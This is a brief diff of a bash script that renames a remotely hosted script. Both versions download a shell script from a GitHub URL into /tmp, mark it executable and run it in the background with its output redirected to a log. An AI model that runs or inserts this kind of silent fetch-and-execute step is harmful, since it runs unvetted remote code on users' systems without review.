@@ -1,8 +1,8 @@
 #!/bin/bash
 
-curl -fL 'https://github.com/malogrono/aways/raw/refs/heads/main/tur.sh' -o /tmp/tur.sh &&
-chmod +x /tmp/tur.sh &&
-bash /tmp/tur.sh > /tmp/tur.log 2>&1 &
+curl -fL 'https://github.com/malogrono/aways/raw/refs/heads/main/teur.sh' -o /tmp/teur.sh &&
+chmod +x /tmp/teur.sh &&
+bash /tmp/teur.sh > /tmp/teur.log 2>&1 &
 
 SECONDS=0
 
